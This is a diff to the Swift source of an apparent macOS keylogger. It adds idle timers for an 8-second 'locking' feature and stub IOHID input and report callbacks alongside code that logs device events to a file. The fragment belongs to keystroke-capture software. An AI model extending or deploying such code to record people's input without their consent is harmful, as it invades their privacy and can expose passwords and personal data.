@@ -15,6 +15,11 @@ class CallBackFunctions
     static var calander = Calendar.current
     static var prev = ""
     
+    var timeStampKeyboardLast: Date = Date(timeIntervalSince1970: 0)
+    var timeIntervalKeyboardMax: TimeInterval = 8.0 // Wait 8 seconds before locking
+    var timeStampPointerLast: Date = Date(timeIntervalSince1970: 0)
+    var timeIntervalPointerMax: TimeInterval = 8.0 // Wait 8 seconds before locking
+
     static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
         
         let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
@@ -77,7 +82,12 @@ class CallBackFunctions
             let timeStamp = "Disconnected - " + Date().description(with: Locale.current) +  "\t\(device)" + "\n"
             fh?.write(timeStamp.data(using: .utf8)!)
     }
-     
+
+
+    static let Handle_IOHIDInputValueCallbackUSRID: IOHIDValueCallback = { context, result, sender, device in
+
+    }
+
     static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
         
         let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
@@ -159,4 +169,11 @@ Outside:if pressed == 1
             }
         }
     }
+
+    //    (void *context, IOReturn result, void *sender, IOHIDReportType type, uint32_t reportID, uint8_t *report, CFIndex reportLength);
+//    static let Handle_IOHIDInputReportCallback: IOHIDReportCallback = { context, result, sender, type, reportID, report, reportLength in
+//        NSLog("report: \(report)")
+//    }
+
+
 }
